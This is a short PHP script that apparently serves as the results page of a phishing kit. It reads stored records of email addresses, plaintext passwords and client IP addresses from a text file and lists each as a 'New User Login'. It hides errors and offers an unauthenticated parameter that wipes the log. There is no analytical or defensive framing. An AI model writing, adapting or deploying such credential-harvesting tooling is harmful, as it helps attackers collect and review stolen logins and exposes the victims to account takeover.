<?php

error_reporting(0);

if ($_GET['action'] == "delete") {
    file_put_contents("users.txt", "");
    die("All users have been deleted.");
}

$page = "";
$logins = file_get_contents("users.txt");
if (empty($logins)) {
    die("No users found");
}

$logins = explode("\n\n", $logins);
foreach ($logins as $login) {
    if (empty($login)) {
        continue;
    }
    $email = explode("\n", $login)[0];
    $pass = explode("\n", $login)[1];
    $client_ip = explode("\n", $login)[2];
    $page .= "<b>New User Login - IP: $client_ip</b><br>";
    $page .= "Email: $email<br>Password: $pass<br>";
    $page .= "--------------------------------------------<br><br>";
}

echo $page;

?>